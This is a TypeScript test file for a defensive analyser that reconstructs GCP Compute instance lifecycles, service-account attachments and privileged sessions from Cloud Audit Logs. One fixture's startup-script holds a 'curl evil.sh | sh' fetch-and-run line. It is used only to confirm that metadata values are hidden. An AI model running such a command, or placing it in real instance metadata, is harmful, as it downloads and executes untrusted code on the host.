// #1066 (931.8 second half, GCP half): the instance compute lifecycle built over one Cloud Audit
// Log upload — the launch facts as the insert's request states them, every later recorded
// operation, a service-account-attachment fact reusing #1065's own decode, calls recorded from
// the attached email while it was recorded as attached, and nothing the records do not say. No
// firewall/tag join is made and an attached email is never claimed unique to this instance (#1073).
import { describe, expect, it } from "vitest";
import { gcpComputeLifecycles, GCP_COMPUTE_MAX } from "../../src/analysis/gcpCompute.js";
import { parseGcpInstanceResourceName } from "../../src/analysis/gcpComputeState.js";

const PROJECT = "proj-1";
const ZONE = "us-central1-a";
const INST = "vm-1";
const RESOURCE_NAME = `projects/${PROJECT}/zones/${ZONE}/instances/${INST}`;
const T = "2024-05-01T09:00:00Z";
const at = (s: number): string => new Date(Date.parse(T) + s * 1000).toISOString();

const gcp = (method: string, over: Record<string, unknown> = {}): Record<string, unknown> => ({
  protoPayload: {
    methodName: method,
    serviceName: "compute.googleapis.com",
    resourceName: RESOURCE_NAME,
    timestamp: T,
    authenticationInfo: { principalEmail: "alice@example.com" },
    request: {},
    ...over,
  },
});

describe("parseGcpInstanceResourceName", () => {
  it("parses the full documented shape", () => {
    expect(parseGcpInstanceResourceName(RESOURCE_NAME)).toEqual({
      project: PROJECT,
      zone: ZONE,
      instanceName: INST,
    });
  });
  it("returns null for a partial or non-instance resourceName — never guessed", () => {
    expect(parseGcpInstanceResourceName(`projects/${PROJECT}/zones/${ZONE}`)).toBeNull();
    expect(parseGcpInstanceResourceName(`projects/${PROJECT}/global/firewalls/f1`)).toBeNull();
  });
});

describe("gcpComputeLifecycles", () => {
  it("reads the launch facts from the insert request, metadata keys only never values", () => {
    const insert = gcp("v1.compute.instances.insert", {
      request: {
        machineType: "zones/us-central1-a/machineTypes/e2-medium",
        disks: [{ initializeParams: { sourceImage: "projects/debian-cloud/global/images/debian-12" } }],
        networkInterfaces: [
          { network: "global/networks/default", subnetwork: "regions/us-central1/subnetworks/default" },
        ],
        metadata: { items: [{ key: "startup-script", value: "#!/bin/bash\ncurl evil.sh | sh" }] },
      },
    });
    const [row] = gcpComputeLifecycles([insert], "u1");
    expect(row.description).toContain("e2-medium");
    expect(row.description).toContain("debian-12");
    expect(row.description).toContain("startup-script");
    expect(row.description).not.toContain("curl evil.sh");
    expect(row.severity).toBe("Low");
  });

  it("a denied insert (status.code present) is not the launch", () => {
    const insert = gcp("v1.compute.instances.insert", { status: { code: 7 } });
    expect(gcpComputeLifecycles([insert], "u1")).toHaveLength(0);
  });

  it("start/stop/delete are recorded operations, never a fabricated transition", () => {
    const insert = gcp("v1.compute.instances.insert", { timestamp: at(0) });
    const start = gcp("v1.compute.instances.start", { timestamp: at(10) });
    const stop = gcp("v1.compute.instances.stop", { timestamp: at(20) });
    const [row] = gcpComputeLifecycles([insert, start, stop], "u1");
    expect(row.description).toContain("recorded: started");
    expect(row.description).toContain("recorded: stopped");
  });

  it("setMetadata is a presence-only fact, never its content", () => {
    const insert = gcp("v1.compute.instances.insert", { timestamp: at(0) });
    const setMeta = gcp("v1.compute.instances.setMetadata", {
      timestamp: at(5),
      request: { items: [{ key: "ssh-keys", value: "attacker-key" }] },
    });
    const [row] = gcpComputeLifecycles([insert, setMeta], "u1");
    expect(row.description).toContain("metadata replaced (content not shown)");
    expect(row.description).not.toContain("attacker-key");
  });

  it("instances.setServiceAccount is decoded via #1065's own function — service-account-attached fires", () => {
    const insert = gcp("v1.compute.instances.insert", { timestamp: at(0) });
    const attach = gcp("v1.compute.instances.setServiceAccount", {
      timestamp: at(5),
      request: { email: "sa1@proj-1.iam.gserviceaccount.com" },
    });
    const [row] = gcpComputeLifecycles([insert, attach], "u1");
    expect(row.canonical?.gcpCompute?.facts).toContain("service-account-attached");
    expect(row.canonical?.gcpCompute?.attachments).toHaveLength(1);
    expect(row.canonical?.gcpCompute?.attachments[0].email).toBe("sa1@proj-1.iam.gserviceaccount.com");
    expect(row.canonical?.gcpCompute?.attachments[0].to).toBeUndefined();
  });

  it("insert's request.serviceAccounts[].email is ALSO decoded as an attachment (via the same #1065 function)", () => {
    const insert = gcp("v1.compute.instances.insert", {
      timestamp: at(0),
      request: { serviceAccounts: [{ email: "default-sa@proj-1.iam.gserviceaccount.com" }] },
    });
    const [row] = gcpComputeLifecycles([insert], "u1");
    expect(row.canonical?.gcpCompute?.facts).toContain("service-account-attached");
  });

  it("a setServiceAccount with an empty email closes the open interval — detachment, never a new attachment", () => {
    const insert = gcp("v1.compute.instances.insert", { timestamp: at(0) });
    const attach = gcp("v1.compute.instances.setServiceAccount", {
      timestamp: at(5),
      request: { email: "sa1@proj-1.iam.gserviceaccount.com" },
    });
    const detach = gcp("v1.compute.instances.setServiceAccount", {
      timestamp: at(10),
      request: { email: "" },
    });
    const [row] = gcpComputeLifecycles([insert, attach, detach], "u1");
    const attachment = row.canonical?.gcpCompute?.attachments[0];
    expect(attachment?.email).toBe("sa1@proj-1.iam.gserviceaccount.com");
    expect(attachment?.to).toBeDefined();
  });

  it("calls recorded from the attached email are tallied as a session, hedged wording", () => {
    const insert = gcp("v1.compute.instances.insert", { timestamp: at(0) });
    const attach = gcp("v1.compute.instances.setServiceAccount", {
      timestamp: at(5),
      request: { email: "sa1@proj-1.iam.gserviceaccount.com" },
    });
    const call = {
      protoPayload: {
        methodName: "storage.objects.get",
        serviceName: "storage.googleapis.com",
        timestamp: at(10),
        authenticationInfo: { principalEmail: "sa1@proj-1.iam.gserviceaccount.com" },
      },
    };
    const [row] = gcpComputeLifecycles([insert, attach, call], "u1");
    expect(row.description).toContain("calls recorded from sa1@proj-1.iam.gserviceaccount.com");
    expect(row.description).toContain("this account may be shared with other resources");
    expect(row.canonical?.gcpCompute?.sessions[0].records).toBe(1);
  });

  it("a call from the same email BEFORE attachment or AFTER detachment is never tallied", () => {
    const before = {
      protoPayload: {
        methodName: "storage.objects.get",
        serviceName: "storage.googleapis.com",
        timestamp: at(0),
        authenticationInfo: { principalEmail: "sa1@proj-1.iam.gserviceaccount.com" },
      },
    };
    const insert = gcp("v1.compute.instances.insert", { timestamp: at(5) });
    const attach = gcp("v1.compute.instances.setServiceAccount", {
      timestamp: at(10),
      request: { email: "sa1@proj-1.iam.gserviceaccount.com" },
    });
    const detach = gcp("v1.compute.instances.setServiceAccount", {
      timestamp: at(15),
      request: { email: "" },
    });
    const after = {
      protoPayload: {
        methodName: "storage.objects.get",
        serviceName: "storage.googleapis.com",
        timestamp: at(20),
        authenticationInfo: { principalEmail: "sa1@proj-1.iam.gserviceaccount.com" },
      },
    };
    const [row] = gcpComputeLifecycles([before, insert, attach, detach, after], "u1");
    expect(row.canonical?.gcpCompute?.sessions).toHaveLength(0);
  });

  it("a High-severity call (GCP_RULES) from the attached email fires session-privileged-change", () => {
    const insert = gcp("v1.compute.instances.insert", { timestamp: at(0) });
    const attach = gcp("v1.compute.instances.setServiceAccount", {
      timestamp: at(5),
      request: { email: "sa1@proj-1.iam.gserviceaccount.com" },
    });
    const key = {
      protoPayload: {
        methodName: "google.iam.admin.v1.CreateServiceAccountKey",
        serviceName: "iam.googleapis.com",
        timestamp: at(10),
        authenticationInfo: { principalEmail: "sa1@proj-1.iam.gserviceaccount.com" },
      },
    };
    const [row] = gcpComputeLifecycles([insert, attach, key], "u1");
    expect(row.canonical?.gcpCompute?.facts).toContain("session-privileged-change");
    expect(row.severity).toBe("High");
  });

  it("grades two distinct fact kinds High, one Medium, none Low (insert-only)", () => {
    const insertOnly = gcp("v1.compute.instances.insert", { timestamp: at(0) });
    expect(gcpComputeLifecycles([insertOnly], "u1")[0].severity).toBe("Low");

    const insert = gcp("v1.compute.instances.insert", { timestamp: at(0) });
    const attach = gcp("v1.compute.instances.setServiceAccount", {
      timestamp: at(5),
      request: { email: "sa1@proj-1.iam.gserviceaccount.com" },
    });
    expect(gcpComputeLifecycles([insert, attach], "u1")[0].severity).toBe("Medium");
  });

  it("an instance with no insert and fewer than 2 operations and no facts is not reported", () => {
    const start = gcp("v1.compute.instances.start", { timestamp: at(0) });
    expect(gcpComputeLifecycles([start], "u1")).toHaveLength(0);
  });

  it("two instances by resourceName are two separate rows", () => {
    const other = "projects/proj-1/zones/us-central1-a/instances/vm-2";
    const i1 = gcp("v1.compute.instances.insert", { resourceName: RESOURCE_NAME });
    const i2 = gcp("v1.compute.instances.insert", { resourceName: other });
    const rows = gcpComputeLifecycles([i1, i2], "u1");
    expect(rows).toHaveLength(2);
    expect(new Set(rows.map((r) => r.canonical?.gcpCompute?.instanceName))).toEqual(
      new Set(["vm-1", "vm-2"]),
    );
  });

  it("caps rows at GCP_COMPUTE_MAX and reports an omitted row for the rest", () => {
    const records = Array.from({ length: GCP_COMPUTE_MAX + 2 }, (_, i) =>
      gcp("v1.compute.instances.insert", {
        resourceName: `projects/${PROJECT}/zones/${ZONE}/instances/vm-${i}`,
        timestamp: at(i),
      }),
    );
    const rows = gcpComputeLifecycles(records, "u1");
    expect(rows).toHaveLength(GCP_COMPUTE_MAX + 1);
    expect(rows[rows.length - 1].description).toContain("2 further instance");
  });
});
